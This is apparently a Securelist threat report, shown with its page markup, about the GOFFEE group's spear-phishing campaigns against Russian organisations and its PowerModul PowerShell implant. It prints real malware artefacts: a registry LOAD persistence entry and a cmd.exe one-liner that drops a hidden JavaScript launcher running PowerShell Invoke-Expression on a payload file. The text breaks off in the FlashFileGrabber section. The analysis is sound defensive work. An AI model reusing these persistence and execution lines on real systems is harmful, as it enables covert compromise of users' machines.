												<img width="1200" height="600" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/09133831/SL-GOFFEE-featured-1200x600.jpg" class="attachment-securelist-2020-thumbnail-large size-securelist-2020-thumbnail-large wp-post-image" alt="" decoding="async" loading="lazy" srcset="" sizes="auto, (max-width: 1200px) 100vw, 1200px" data-src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/09133831/SL-GOFFEE-featured-1200x600.jpg" data-srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/09133831/SL-GOFFEE-featured-1200x600.jpg 1200w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/09133831/SL-GOFFEE-featured-300x150.jpg 300w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/09133831/SL-GOFFEE-featured-1024x512.jpg 1024w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/09133831/SL-GOFFEE-featured-768x384.jpg 768w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/09133831/SL-GOFFEE-featured-1536x768.jpg 1536w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/09133831/SL-GOFFEE-featured-700x350.jpg 700w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/09133831/SL-GOFFEE-featured-740x370.jpg 740w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/09133831/SL-GOFFEE-featured-560x280.jpg 560w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/09133831/SL-GOFFEE-featured-800x400.jpg 800w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/09133831/SL-GOFFEE-featured.jpg 2000w" />											</figure>

											<div class="c-article__authors u-hidden u-block@md">
												<p class="c-block__title">Authors</p>
												<ul class="c-list-authors">
																<li>
			<a  href="https://securelist.com/author/olegkupreev/" >
													<img src="https://securelist.com/wp-content/themes/securelist2020/assets/images/avatar-default/avatar_default_3.png">
										<span>Oleg Kupreev</span></a>
		</li>
														</ul>
											</div>

											
											<div class="js-reading-content">
												<div class="c-wysiwyg">
													<p>GOFFEE is a threat actor that first <a href="https://securelist.com/apt-trends-report-q3-2023/110752/#chinese-speaking-activity" target="_blank" rel="noopener">came to our attention</a> in early 2022. Since then, we have observed malicious activities targeting exclusively entities located in the Russian Federation, leveraging spear phishing emails with a malicious attachment. Starting in May 2022 and up until summer of 2023, GOFFEE deployed modified <a href="https://securelist.com/owowa-credential-stealer-and-remote-access/105219/" target="_blank" rel="noopener">Owowa (malicious IIS module)</a> in their attacks. As of 2024, GOFFEE started to deploy patched malicious instances of explorer.exe via spear phishing.</p>
<p>During the second half of 2024, GOFFEE continued to launch targeted attacks against organizations in Russia, utilizing PowerTaskel, a non-public Mythic agent written in PowerShell, and introducing a new implant that we dubbed &#8220;PowerModul&#8221;. The targeted sectors included media and telecommunications, construction, government entities, and energy companies.</p>
<p>This report in a nutshell:</p>
<ul>
<li>GOFFEE updated distribution schemes.</li>
<li>A previously undescribed implant dubbed PowerModul was introduced.</li>
<li>GOFFEE is increasingly abandoning the use of PowerTaskel in favor of a binary Mythic agent for lateral movement.</li>
</ul>
<p>For more information, please contact: <a href="mailto:intelreports@kaspersky.com" target="_blank" rel="noopener">intelreports@kaspersky.com</a></p>
<h2 id="technical-details">Technical details</h2>
<h3 id="initial-infection">Initial infection</h3>
<p>Currently, several infection schemes are being used at the same time. The starting point is typically a phishing email with a malicious attachment, but the schemes diverge slightly from there. We will review two of them relevant at the time of the research.</p>
<p>The first infection scheme uses a RAR archive with an executable file masquerading as a document. In some cases, the file name uses a double extension, such as &#8220;.pdf.exe&#8221; or &#8220;.doc.exe&#8221;. When the user clicks the executable file, a decoy document is downloaded from the C2 and opened, while malicious activity is carried out in parallel.</p>
<div id="attachment_116141" style="width: 559px" class="wp-caption aligncenter"><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08134411/goffee-apt-new-attacks-EN1.png" class="magnificImage"><img loading="lazy" decoding="async" aria-describedby="caption-attachment-116141" class="size-full wp-image-116141" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08134411/goffee-apt-new-attacks-EN1.png" alt="Example of decoy document" width="549" height="774" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08134411/goffee-apt-new-attacks-EN1.png 549w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08134411/goffee-apt-new-attacks-EN1-213x300.png 213w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08134411/goffee-apt-new-attacks-EN1-248x350.png 248w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08134411/goffee-apt-new-attacks-EN1-199x280.png 199w" sizes="auto, (max-width: 549px) 100vw, 549px" /></a><p id="caption-attachment-116141" class="wp-caption-text">Example of decoy document</p></div>
<p>The file itself is a Windows system file (explorer.exe or xpsrchvw.exe), with part of its code patched with a malicious shellcode. The shellcode is similar to what we saw in earlier attacks, but in addition contains an obfuscated Mythic agent, which immediately begins communicating with the command-and-control (C2) server.</p>
<div id="attachment_116142" style="width: 1513px" class="wp-caption aligncenter"><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08134607/goffee-apt-new-attacks-EN2.png" class="magnificImage"><img loading="lazy" decoding="async" aria-describedby="caption-attachment-116142" class="size-full wp-image-116142" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08134607/goffee-apt-new-attacks-EN2.png" alt="Malware execution flow v1" width="1503" height="388" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08134607/goffee-apt-new-attacks-EN2.png 1503w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08134607/goffee-apt-new-attacks-EN2-300x77.png 300w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08134607/goffee-apt-new-attacks-EN2-1024x264.png 1024w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08134607/goffee-apt-new-attacks-EN2-768x198.png 768w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08134607/goffee-apt-new-attacks-EN2-1356x350.png 1356w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08134607/goffee-apt-new-attacks-EN2-740x191.png 740w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08134607/goffee-apt-new-attacks-EN2-1085x280.png 1085w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08134607/goffee-apt-new-attacks-EN2-800x207.png 800w" sizes="auto, (max-width: 1503px) 100vw, 1503px" /></a><p id="caption-attachment-116142" class="wp-caption-text">Malware execution flow v1</p></div>
<p>In the second case, the RAR archive contains a Microsoft Office document with a macro that serves as a dropper.</p>
<div id="attachment_116143" style="width: 1763px" class="wp-caption aligncenter"><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08134932/goffee-apt-new-attacks-EN3.png" class="magnificImage"><img loading="lazy" decoding="async" aria-describedby="caption-attachment-116143" class="size-full wp-image-116143" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08134932/goffee-apt-new-attacks-EN3.png" alt="Malware execution flow v2" width="1753" height="1248" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08134932/goffee-apt-new-attacks-EN3.png 1753w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08134932/goffee-apt-new-attacks-EN3-300x214.png 300w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08134932/goffee-apt-new-attacks-EN3-1024x729.png 1024w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08134932/goffee-apt-new-attacks-EN3-768x547.png 768w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08134932/goffee-apt-new-attacks-EN3-1536x1094.png 1536w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08134932/goffee-apt-new-attacks-EN3-492x350.png 492w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08134932/goffee-apt-new-attacks-EN3-740x527.png 740w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08134932/goffee-apt-new-attacks-EN3-393x280.png 393w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08134932/goffee-apt-new-attacks-EN3-800x570.png 800w" sizes="auto, (max-width: 1753px) 100vw, 1753px" /></a><p id="caption-attachment-116143" class="wp-caption-text">Malware execution flow v2</p></div>
<div id="attachment_116144" style="width: 991px" class="wp-caption aligncenter"><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08135036/goffee-apt-new-attacks-EN4.png" class="magnificImage"><img loading="lazy" decoding="async" aria-describedby="caption-attachment-116144" class="size-full wp-image-116144" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08135036/goffee-apt-new-attacks-EN4.png" alt="Malicious document with a macro" width="981" height="871" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08135036/goffee-apt-new-attacks-EN4.png 981w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08135036/goffee-apt-new-attacks-EN4-300x266.png 300w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08135036/goffee-apt-new-attacks-EN4-768x682.png 768w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08135036/goffee-apt-new-attacks-EN4-394x350.png 394w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08135036/goffee-apt-new-attacks-EN4-740x657.png 740w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08135036/goffee-apt-new-attacks-EN4-315x280.png 315w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08135036/goffee-apt-new-attacks-EN4-800x710.png 800w" sizes="auto, (max-width: 981px) 100vw, 981px" /></a><p id="caption-attachment-116144" class="wp-caption-text">Malicious document with a macro</p></div>
<p>When a document is opened, scrambled text and a warning image with the message, &#8220;This document was created in an earlier version of Microsoft Office Word. For Microsoft Office Word to display the contents correctly, click &#8216;Enable Content'&#8221;, are shown. Clicking &#8220;Enable Content&#8221; activates a macro that hides the warning image and restores the text through a normal character replacement operation. Additionally, the macro creates two files in the user&#8217;s current folder: an HTA and a PowerShell file, and writes the HTA into the registry using the &#8220;LOAD&#8221; registry value of the &#8220;HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows&#8221; registry key.</p>
		<div id="crayon-67fada0777664465154125" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows
"LOAD"="C:\Users\&lt;USER_NAME&gt;\UserCache.ini.hta"</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-67fada0777664465154125-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-67fada0777664465154125-2">2</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-67fada0777664465154125-1"><span class="crayon-i">HKCU</span><span class="crayon-sy">\</span><span class="crayon-i">Software</span><span class="crayon-sy">\</span><span class="crayon-i">Microsoft</span><span class="crayon-sy">\</span><span class="crayon-e">Windows </span><span class="crayon-i">NT</span><span class="crayon-sy">\</span><span class="crayon-i">CurrentVersion</span><span class="crayon-sy">\</span><span class="crayon-i">Windows</span></div><div class="crayon-line crayon-striped-line" id="crayon-67fada0777664465154125-2"><span class="crayon-s">"LOAD"</span>=<span class="crayon-s">"C:\Users\&lt;USER_NAME&gt;\UserCache.ini.hta"</span></div></div></td>
					</tr>
				</table>
			</div>
		</div><p>
Although the macro itself does not start anything or create new processes, the programs listed in the &#8220;LOAD&#8221; value of the registry key are run automatically for the currently logged-on user.</p>
<div id="attachment_116145" style="width: 1087px" class="wp-caption aligncenter"><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08135224/goffee-apt-new-attacks-EN5.png" class="magnificImage"><img loading="lazy" decoding="async" aria-describedby="caption-attachment-116145" class="size-full wp-image-116145" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08135224/goffee-apt-new-attacks-EN5.png" alt="UserCache.ini.hta content" width="1077" height="786" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08135224/goffee-apt-new-attacks-EN5.png 1077w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08135224/goffee-apt-new-attacks-EN5-300x219.png 300w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08135224/goffee-apt-new-attacks-EN5-1024x747.png 1024w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08135224/goffee-apt-new-attacks-EN5-768x560.png 768w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08135224/goffee-apt-new-attacks-EN5-480x350.png 480w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08135224/goffee-apt-new-attacks-EN5-740x540.png 740w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08135224/goffee-apt-new-attacks-EN5-384x280.png 384w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08135224/goffee-apt-new-attacks-EN5-800x584.png 800w" sizes="auto, (max-width: 1077px) 100vw, 1077px" /></a><p id="caption-attachment-116145" class="wp-caption-text">UserCache.ini.hta content</p></div>
<p>The malicious HTA runs a PowerShell script (PowerModul), but not directly. Instead, it first uses cmd.exe and output redirection to drop a JavaScript file named &#8220;UserCacheHelper.lnk.js&#8221; onto the disk, and then executes it. Only then does the dropped JavaScript run PowerModul:</p>
		<div id="crayon-67fada077766d507703540" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
cmd.exe /c if not exist "C:\Users\user\UserCacheHelper.lnk.js" echo var objService = GetObject("winmgmts:\\\\.\\root\\cimv2");var objStartup = objService.Get("Win32_ProcessStartup");var objConfig = objStartup.SpawnInstance_();objConfig.ShowWindow = 0;var processClass = objService.Get("Win32_Process");var command = "powershell.exe -c \"$raw= Get-Content C:\\Users\\user\\UserCache.ini;Invoke-Expression $raw\"";var result = processClass.Create(command, null, objConfig, 0); &gt; C:\Users\user\UserCacheHelper.lnk.js</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-67fada077766d507703540-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-i">c</span><span class="crayon-h"> </span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-st">not</span><span class="crayon-h"> </span><span class="crayon-i">exist</span><span class="crayon-h"> </span><span class="crayon-s">"C:\Users\user\UserCacheHelper.lnk.js"</span><span class="crayon-h"> </span><span class="crayon-e">echo </span><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-i">objService</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-e">GetObject</span><span class="crayon-sy">(</span><span class="crayon-s">"winmgmts:\\\\.\\root\\cimv2"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-i">objStartup</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-i">objService</span><span class="crayon-sy">.</span><span class="crayon-e">Get</span><span class="crayon-sy">(</span><span class="crayon-s">"Win32_ProcessStartup"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-i">objConfig</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-i">objStartup</span><span class="crayon-sy">.</span><span class="crayon-e">SpawnInstance_</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-i">objConfig</span><span class="crayon-sy">.</span><span class="crayon-i">ShowWindow</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">;</span><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-i">processClass</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-i">objService</span><span class="crayon-sy">.</span><span class="crayon-e">Get</span><span class="crayon-sy">(</span><span class="crayon-s">"Win32_Process"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-i">command</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-s">"powershell.exe -c \"$raw= Get-Content C:\\Users\\user\\UserCache.ini;Invoke-Expression $raw\""</span><span class="crayon-sy">;</span><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-i">result</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-i">processClass</span><span class="crayon-sy">.</span><span class="crayon-e">Create</span><span class="crayon-sy">(</span><span class="crayon-i">command</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-t">null</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">objConfig</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-h">&gt;</span><span class="crayon-h"> </span><span class="crayon-i">C</span><span class="crayon-sy">:</span><span class="crayon-sy">\</span><span class="crayon-i">Users</span><span class="crayon-sy">\</span><span class="crayon-i">user</span><span class="crayon-sy">\</span><span class="crayon-i">UserCacheHelper</span><span class="crayon-sy">.</span><span class="crayon-i">lnk</span><span class="crayon-sy">.</span><span class="crayon-i">js</span></div></div></td>
					</tr>
				</table>
			</div>
		</div><p>
It is worth noting that &#8220;UserCache.ini.hta&#8221; and &#8220;UserCacheHelper.lnk.js&#8221; contain strings with full paths to the files, including the local user&#8217;s name, instead of environment variables. As a result, the control keys, as well as the file sizes, will vary depending on the current user&#8217;s name.</p>
<div id="attachment_116146" style="width: 671px" class="wp-caption aligncenter"><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08135713/goffee-apt-new-attacks-EN6.png" class="magnificImage"><img loading="lazy" decoding="async" aria-describedby="caption-attachment-116146" class="size-full wp-image-116146" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08135713/goffee-apt-new-attacks-EN6.png" alt="UserCacheHelper.lnk.js content" width="661" height="94" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08135713/goffee-apt-new-attacks-EN6.png 661w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08135713/goffee-apt-new-attacks-EN6-300x43.png 300w" sizes="auto, (max-width: 661px) 100vw, 661px" /></a><p id="caption-attachment-116146" class="wp-caption-text">UserCacheHelper.lnk.js content</p></div>
<p>The &#8220;UserCacheHelper.lnk.js&#8221; file launches a PowerShell file named &#8220;UserCache.ini&#8221;, dropped by the initial macro. This file contains encoded PowerModul.</p>
<h3 id="powermodul">PowerModul</h3>
<table>
<tbody>
<tr>
<td><strong>MD5</strong></td>
<td>60A53D2C653991F086C4E6663D652CF2</td>
</tr>
<tr>
<td><strong>SHA1</strong></td>
<td>636814C31B78DD291049029A655238D7ADAFF041</td>
</tr>
<tr>
<td><strong>SHA256</strong></td>
<td>BE1D0FAF1C253FAACBA1059971B01D1D646256D7B2E557DA55ED059542AFDBCD</td>
</tr>
<tr>
<td><strong>File type</strong></td>
<td>PowerShell</td>
</tr>
<tr>
<td><strong>File size</strong></td>
<td>6.66 KB</td>
</tr>
<tr>
<td><strong>File name</strong></td>
<td>UserCache.ini</td>
</tr>
</tbody>
</table>
<p>PowerModul is a PowerShell script capable of receiving and executing additional PowerShell scripts from the C2 server. The first instances of this implant&#8217;s usage were detected at the beginning of 2024. Initially, it was used to download and launch the PowerTaskel implant, and was considered a relatively minor component for launching PowerTaskel. However, its use of a unique protocol, distinct payload types, and a C2 server different from PowerTaskel&#8217;s led us to classify it as a separate family.</p>
<div id="attachment_116147" style="width: 613px" class="wp-caption aligncenter"><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08135900/goffee-apt-new-attacks-EN7.png" class="magnificImage"><img loading="lazy" decoding="async" aria-describedby="caption-attachment-116147" class="size-full wp-image-116147" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08135900/goffee-apt-new-attacks-EN7.png" alt="UserCache.ini content" width="603" height="348" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08135900/goffee-apt-new-attacks-EN7.png 603w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08135900/goffee-apt-new-attacks-EN7-300x173.png 300w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08135900/goffee-apt-new-attacks-EN7-485x280.png 485w" sizes="auto, (max-width: 603px) 100vw, 603px" /></a><p id="caption-attachment-116147" class="wp-caption-text">UserCache.ini content</p></div>
<p>In the scheme being described, the PowerModul code is embedded in the &#8220;UserCache.ini&#8221; file as a Base64-encoded string. The beginning and end of the decoded script are shown in the images below, while the middle section contains a copy of the HTA file, as well as code responsible for dropping the HTA file onto the disk, writing it to the registry, and hiding the file by changing its attributes to &#8220;Hidden&#8221;. Essentially, this code replicates part of the functionality of the VBA macro found in the Word document, except for file hiding, which was not implemented in VBA.</p>
<div id="attachment_116148" style="width: 1056px" class="wp-caption aligncenter"><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08140028/goffee-apt-new-attacks-EN8.png" class="magnificImage"><img loading="lazy" decoding="async" aria-describedby="caption-attachment-116148" class="size-full wp-image-116148" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08140028/goffee-apt-new-attacks-EN8.png" alt="Beginning of PowerModul" width="1046" height="919" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08140028/goffee-apt-new-attacks-EN8.png 1046w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08140028/goffee-apt-new-attacks-EN8-300x264.png 300w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08140028/goffee-apt-new-attacks-EN8-1024x900.png 1024w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08140028/goffee-apt-new-attacks-EN8-768x675.png 768w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08140028/goffee-apt-new-attacks-EN8-398x350.png 398w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08140028/goffee-apt-new-attacks-EN8-740x650.png 740w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08140028/goffee-apt-new-attacks-EN8-319x280.png 319w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08140028/goffee-apt-new-attacks-EN8-800x703.png 800w" sizes="auto, (max-width: 1046px) 100vw, 1046px" /></a><p id="caption-attachment-116148" class="wp-caption-text">Beginning of PowerModul</p></div>
<div id="attachment_116149" style="width: 839px" class="wp-caption aligncenter"><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08140113/goffee-apt-new-attacks-EN9.png" class="magnificImage"><img loading="lazy" decoding="async" aria-describedby="caption-attachment-116149" class="size-full wp-image-116149" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08140113/goffee-apt-new-attacks-EN9.png" alt="End of PowerModul" width="829" height="916" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08140113/goffee-apt-new-attacks-EN9.png 829w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08140113/goffee-apt-new-attacks-EN9-272x300.png 272w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08140113/goffee-apt-new-attacks-EN9-768x849.png 768w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08140113/goffee-apt-new-attacks-EN9-317x350.png 317w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08140113/goffee-apt-new-attacks-EN9-740x818.png 740w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08140113/goffee-apt-new-attacks-EN9-253x280.png 253w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08140113/goffee-apt-new-attacks-EN9-800x884.png 800w" sizes="auto, (max-width: 829px) 100vw, 829px" /></a><p id="caption-attachment-116149" class="wp-caption-text">End of PowerModul</p></div>

			</div>
		</div><p>
There is an additional, previously undescribed function in PowerModul, named &#8220;OfflineWorker()&#8221;. It decodes a predefined string and executes its contents. In the instance shown in the screenshots above, the string to be decoded is empty, and therefore, nothing is executed. However, we have observed cases where the string contained content. An example of the OfflineWorker() function containing the FlashFileGrabber data stealing tool code is shown below:</p>
		<div id="crayon-67fada0777672017291168" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>

		</div><p>
The payloads used by PowerModul include the PowerTaskel, FlashFileGrabber, and USB Worm tools.</p>
<h3 id="flashfilegrabber">FlashFileGrabber</h3>
<p>As its name suggests, FlashFileGrabber is designed to steal files from removable media, such as flash drives. We have identified two variants: FlashFileGrabber and FlashFileGrabberOffline.</p>
<div id="attachment_116150" style="width: 981px" class="wp-caption aligncenter"><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08140504/goffee-apt-new-attacks-EN10.png" class="magnificImage"><img loading="lazy" decoding="async" aria-describedby="caption-attachment-116150" class="size-full wp-image-116150" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08140504/goffee-apt-new-attacks-EN10.png" alt="FlashFileGrabberOffline main routine" width="971" height="713" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08140504/goffee-apt-new-attacks-EN10.png 971w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08140504/goffee-apt-new-attacks-EN10-300x220.png 300w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08140504/goffee-apt-new-attacks-EN10-768x564.png 768w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/08140504/goffee-apt-new-attacks-EN10-477x350.png 477w, 